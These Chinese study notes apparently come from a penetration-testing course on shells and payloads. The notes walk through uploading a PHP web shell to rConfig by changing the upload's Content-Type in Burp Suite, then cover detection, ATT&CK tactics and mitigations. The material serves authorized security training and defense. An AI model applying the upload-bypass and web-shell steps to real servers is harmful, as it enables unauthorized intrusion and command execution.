我们将使用 [WhiteWinterWolf 的 PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)。我们可以下载它或将源代码复制粘贴到 `.php` 文件中。请记住，文件类型很重要，我们很快就会看到。我们的目标是通过供应商 Logo `浏览`按钮上传 PHP Web shell。最初尝试这样做会失败，因为 rConfig 正在检查文件类型。它只允许上传图像文件类型（.png、.jpg、.gif 等）。但是，我们可以使用 `Burp Suite` 绕过这个限制。

启动 Burp Suite，导航到浏览器的网络设置菜单并填写代理设置。`127.0.0.1` 放入 IP 地址字段，`8080` 放入端口字段，以确保所有请求都通过 Burp（回想一下 Burp 充当 Web 代理）。

#### 代理设置

![image](https://academy.hackthebox.com/storage/modules/115/proxy_settings.png)

我们的目标是更改 `content-type` 以绕过上传文件的文件类型限制，使其"呈现"为供应商 logo，这样我们就可以导航到该文件并获得我们的 Web shell。

---

## 绕过文件类型限制

打开 Burp 并正确配置我们的 Web 浏览器代理设置后，我们现在可以上传 PHP Web shell。点击浏览按钮，导航到我们的 .php 文件存储在攻击机上的位置，选择打开并`保存`（我们可能需要接受 PortSwigger 证书）。看起来网页好像挂起了，但这只是因为我们需要告诉 Burp 转发 HTTP 请求。转发请求，直到你看到包含我们文件上传的 POST 请求。它看起来像这样：

#### Post 请求

![Burp](https://academy.hackthebox.com/storage/modules/115/burp.png)

如前一节所述，你会注意到一些有效载荷有作者的注释，解释用法、提供致谢和个人博客链接。这可能会暴露我们，所以保留注释并不总是最好的选择。我们将把 Content-type 从 `application/x-php` 更改为 `image/gif`。这基本上会"欺骗"服务器，让我们上传 .php 文件，绕过文件类型限制。一旦我们这样做，我们可以选择 `Forward` 两次，文件就会被提交。我们现在可以关闭 Burp 拦截器并返回浏览器查看结果。

#### 供应商已添加

![Burp](https://academy.hackthebox.com/storage/modules/115/added_vendor.png)

消息：'Added new vendor NetVen to Database' 让我们知道文件上传成功。我们还可以看到 NetVen 供应商条目，logo 显示一张撕裂的纸片。这意味着 rConfig 没有将文件类型识别为图像，所以它默认使用了那个图像。我们现在可以尝试使用我们的 Web shell。使用浏览器，导航到 rConfig 服务器上的这个目录：

`/images/vendor/connect.php`

这会执行有效载荷，并在浏览器中为我们提供一个非交互式 shell 会话，允许我们在底层操作系统上执行命令。

#### Webshell 成功

![image](https://academy.hackthebox.com/storage/modules/115/web_shell_now.png)

---

## 处理 Web Shell 时的注意事项

在使用 Web shell 时，请考虑渗透测试过程中可能出现的以下潜在问题：

- Web 应用程序有时会在预定义的时间段后自动删除文件
- 在导航文件系统、下载和上传文件方面与操作系统的交互有限，链接命令可能不起作用（例如 `whoami && hostname`），减慢进度，特别是在进行枚举时 - 通过非交互式 Web shell 可能存在的不稳定性
- 更大的可能留下我们成功攻击的证据

根据参与类型（即黑盒规避评估），我们可能需要尝试不被检测并`掩盖我们的踪迹`。我们经常帮助客户测试他们检测实时威胁的能力，因此我们应该尽可能模拟恶意攻击者可能尝试的方法，包括尝试隐秘操作。这将帮助我们的客户，从长远来看也能让我们避免在参与期结束后文件被发现的问题。在大多数情况下，当尝试与目标建立 shell 会话时，明智的做法是建立反向 shell，然后删除已执行的有效载荷。此外，我们必须记录我们尝试的每种方法、有效的和无效的，甚至包括我们尝试使用的有效载荷和文件的名称。我们可以在报告中包括文件名的 sha1sum 或 MD5 哈希、上传位置作为证据，并提供归因。#shell #hacking #mitre [source](https://academy.hackthebox.com/module/115/section/1184)


---

我们现在正在下坡路上！让我们从渗透主机的超级间谍业务中休息一下，看看防御方面。本节探讨检测活动 shell 的方法、在主机上和网络流量中查找有效载荷的方法，以及这些攻击如何被混淆以绕过我们的防御。

---

## 监控

在寻找和识别活动 shell、有效载荷传递和执行以及绕过我们防御的潜在尝试时，我们有许多不同的选项可以用来检测和响应这些事件。在讨论我们可以使用的数据源和工具之前，让我们花点时间讨论 [MITRE ATT&CK 框架](https://attack.mitre.org/)并定义攻击者使用的技术和战术。正如 MITRE 所定义的，`ATT&CK 框架`是"`一个基于真实世界观察的对手战术和技术的全球可访问知识库`"。

#### ATT&CK 框架

![image](https://academy.hackthebox.com/storage/modules/115/attack-framework.png)

牢记该框架，下表列出了与 Shells 和 Payloads 相关的三种最显著的技术及其描述。

---

#### 值得注意的 MITRE ATT&CK 战术和技术：

|**战术/技术**|**描述**|
|---|---|
|[初始访问](https://attack.mitre.org/techniques/T1190/)|攻击者将尝试通过入侵面向公众的主机或服务来获得初始访问权限，例如 Web 应用程序、配置错误的服务（如 SMB 或身份验证协议）和/或面向公众的主机中引入漏洞的 bug。这通常在某种形式的堡垒主机上完成，为攻击者在网络中提供立足点，但尚未获得完全访问权限。有关初始访问的更多信息，特别是通过 Web 应用程序，请查看 [OWASP Top Ten](https://owasp.org/www-project-top-ten/) 或在 Mitre Att&ck 框架中进一步阅读。|
|[执行](https://attack.mitre.org/tactics/TA0002)|此技术取决于攻击者提供和植入的代码在受害主机上运行。`Shells & Payloads` 模块主要关注此战术。我们使用许多不同的有效载荷、传递方法和 shell 脚本解决方案来访问主机。这可以是从在 Web 浏览器中执行命令以获得 Web 应用程序的执行和访问、通过 PsExec 发出 PowerShell 一行命令、利用公开发布的漏洞或零日漏洞与 Metasploit 等框架结合使用，或通过许多不同的协议将文件上传到主机并远程调用它以接收回调。|
|[命令与控制](https://attack.mitre.org/tactics/TA0011)|命令与控制（`C2`）可以被视为我们在本模块中努力的顶点。我们获得对主机的访问权限，并通过代码执行建立某种持续和/或交互式访问机制，然后利用该访问在受害网络中对目标执行后续操作。使用受害网络中的标准端口和协议发出命令并接收受害者的输出是常见的。这可以表现为通过 HTTP/S 的正常 Web 流量、通过其他常见外部协议（如 DNS 和 NTP）发出的命令，甚至使用常见允许的应用程序（如 Slack、Discord 或 MS Teams）发出命令和接收签到。C2 的复杂程度各不相同，从像 Netcat 这样的基本明文通道到使用加密和混淆协议以及通过代理、重定向器和 VPN 的复杂流量路由。|

---

## 需要关注的事件：

- `文件上传`：特别是对于 Web 应用程序，文件上传是除了在浏览器中直接执行命令之外获取主机 shell 的常见方法。注意应用程序日志以确定是否有人上传了任何潜在恶意内容。使用防火墙和杀毒软件可以为你围绕站点的安全态势增加更多层次。任何从你的网络暴露到互联网的主机都应该得到充分的加固和监控。

- `可疑的非管理员用户操作`：寻找普通用户通过 Bash 或 cmd 发出命令等简单事情可能是入侵的重要指标。普通用户上次需要在主机上发出 `whoami` 命令是什么时候，更不用说管理员了？用户通过 SMB 连接到网络上另一台主机的共享（不是正常的基础设施共享）也可能是可疑的。这种类型的交互通常是终端主机到基础设施服务器，而不是终端主机到终端主机。启用安全措施，如记录所有用户交互、PowerShell 日志记录以及其他在使用 shell 界面时进行记录的功能，将为你提供更多洞察。

- `异常网络会话`：用户往往有他们遵循的网络交互模式。他们访问相同的网站，使用相同的应用程序，并且经常像钟表一样每天多次执行这些操作。记录和解析 NetFlow 数据可以是发现异常网络流量的好方法。查看诸如顶级通信者或独特站点访问、监视非标准端口（如 `4444`，Meterpreter 使用的默认端口）上的心跳、以及监控任何远程登录尝试或短时间内的批量 GET/POST 请求等内容，都可以是入侵或尝试利用的指标。使用网络监控器、防火墙日志和 SIEM 等工具可以帮助为网络流量的混乱带来一些秩序。


---

## 建立网络可见性

就像识别然后使用各种 shell 和有效载荷一样，`检测`和`预防`需要对你试图保护的系统和整体网络环境有详细的了解。拥有良好的文档实践始终很重要，这样负责保护环境安全的个人可以对他们管理的环境中的设备、数据和流量有一致的可见性。开发和维护可视化网络拓扑图可以帮助可视化网络流量流向。较新的工具如 [netbrain](https://www.netbraintech.com) 可能值得研究，因为它们结合了可以使用 [Draw.io](https://draw.io) 等工具实现的可视化图表、文档和远程管理。交互式可视化网络拓扑允许你与路由器、网络防火墙、IDS/IPS 设备、交换机和主机（客户端）进行交互。这类工具正变得越来越普遍，因为保持网络可见性的更新可能很具挑战性，特别是在不断增长的较大环境中。

一些网络设备供应商如 Cisco Meraki、Ubiquiti、Check Point 和 Palo Alto Networks 正在将第 7 层可见性（如 OSI 模型的第 7 层）构建到其网络设备中，并将管理功能移至基于云的网络控制器。这意味着管理员登录 Web 门户来管理环境中的所有网络设备。通常与这些基于云的网络控制器一起提供可视化仪表板，使其更容易拥有流量使用、网络协议、应用程序以及入站和出站流量的`基线`。拥有并理解你网络的基线将使任何偏离常态的行为变得极其明显。你能越快地响应和分类任何潜在问题，泄漏、数据破坏或更糟情况的时间就越少。

请记住，如果有效载荷成功执行，它将需要通过网络通信，这就是为什么在 shell 和有效载荷的上下文中网络可见性至关重要。拥有能够进行[深度包检测](https://en.wikipedia.org/wiki/Deep_packet_inspection)的网络安全设备通常可以充当网络的杀毒软件。如果我们讨论的一些有效载荷在主机上成功执行，它们可能会在网络级别被检测到并被阻止。如果流量未加密，这尤其容易检测。当我们在绑定和反向 shell 部分使用 Netcat 时，源和目标（目标）之间传递的流量`未加密`。有人可以捕获该流量并看到我们在攻击机和目标之间发送的每个命令，如下例所示。

此图像显示了两台主机之间频繁且在可疑端口（`4444`）上的 NetFlow。我们可以看出这是基本的 TCP 流量，所以如果我们采取行动并稍微检查一下，我们可以看到发生了什么。

---

#### 可疑流量.. 明文

![image](https://academy.hackthebox.com/storage/modules/115/pcap-4444.png)

请注意，现在该流量已被展开，我们可以看到有人正在使用 `net` 命令在此主机上创建新用户。

---

#### 跟踪流量

![image](https://academy.hackthebox.com/storage/modules/115/follow-sus.png)

这是一个基本访问和命令执行以通过向主机添加用户来获得持久性的绝佳示例。无论使用的名称是 `hacker`，如果命令行日志记录与 NetFlow 数据配对，我们可以快速判断用户正在执行潜在的恶意操作，并对此事件进行分类以确定是否发生了事件，或者这只是某个管理员在玩耍。现代安全设备可能会使用深度包检测来检测、警报并阻止来自该主机的进一步网络通信。

说到杀毒软件，让我们稍微讨论一下终端设备检测和保护。

---

## 保护终端设备

`终端设备`是连接在网络"末端"的设备。这意味着它们是数据传输的源或目的地。终端设备的一些示例包括：

- 工作站（员工电脑）
- 服务器（在网络上提供各种服务）
- 打印机
- 网络附加存储（NAS）
- 摄像头
- 智能电视
- 智能音箱

我们应该优先保护这类设备，特别是那些运行具有可远程访问的 `CLI` 的操作系统的设备。使管理和自动化设备任务变得容易的同一界面可能使其成为攻击者的良好目标。尽管这看起来很简单，但安装并启用杀毒软件是一个很好的开始。除了配置错误之外，最常见的成功攻击向量是人为因素。用户只需点击链接或打开文件就可能被入侵。在你的终端设备上进行监控和警报可以帮助在问题发生之前检测并可能预防问题。

在 `Windows` 系统上，`Windows Defender`（也称为 Windows 安全或 Microsoft Defender）在安装时存在，应保持启用。此外，确保 Defender 防火墙保持启用，所有配置文件（域、私有和公共）都保持开启。仅根据[变更管理流程](https://www.atlassian.com/itsm/change-management)为已批准的应用程序设置例外。如果尚未建立，则建立[补丁管理](https://www.rapid7.com/fundamentals/patch-management/)策略，以确保所有主机在 Microsoft 发布更新后不久就收到更新。所有这些也适用于托管共享资源和网站的服务器。虽然它可能会降低性能，但服务器上的杀毒软件可以防止有效载荷的执行和与恶意攻击者系统的 shell 会话的建立。

---

## 潜在缓解措施：

在考虑可以采取哪些实施措施来缓解许多这些向量或漏洞利用时，请考虑以下列表。

- `应用程序沙箱`：通过对暴露于外界的应用程序进行沙箱化，你可以限制攻击者在发现应用程序中的漏洞或配置错误时可以执行的访问范围和损害程度。

- `最小权限策略`：限制用户拥有的权限可以大大有助于阻止未授权访问或入侵。普通用户是否需要管理访问权限来执行日常工作？域管理员呢？并不需要，对吧？确保适当的安全策略和权限到位通常会阻止（如果不能完全阻止）攻击。

- `主机分割和加固`：正确加固主机并隔离任何需要暴露于互联网的主机可以帮助确保攻击者在获得边界主机访问权限后无法轻易跳入并在你的网络中横向移动。遵循 STIG 加固指南并将 Web 服务器、VPN 服务器等主机放置在 DMZ 或"隔离"网络段中将阻止这种类型的访问和横向移动。

- `物理和应用层防火墙`：如果正确实施，防火墙可以成为强大的工具。适当的入站和出站规则，只允许首先从你的网络内部建立的流量，在为你的应用程序批准的端口上，并拒绝来自你的网络地址或其他禁止 IP 空间的入站流量，可以削弱许多绑定和反向 shell。它在网络链中增加了一个跳跃，网络实现（如网络地址转换（NAT））可能会破坏 shell 有效载荷的功能（如果没有考虑到这一点）。


---

## 总结

这些保护和缓解措施并不是阻止攻击的全部。在当今时代，需要强大的安全态势和防御策略。采用纵深防御方法来加强你的安全态势将有助于阻止攻击者，并确保容易被利用的漏洞不会轻易被利用。#shell #windows #hacking

要了解如何在 Windows 中部署有效载荷，[[09 - Infiltrating Windows|请参见此处]]

[[Shells|shells 速查表]]

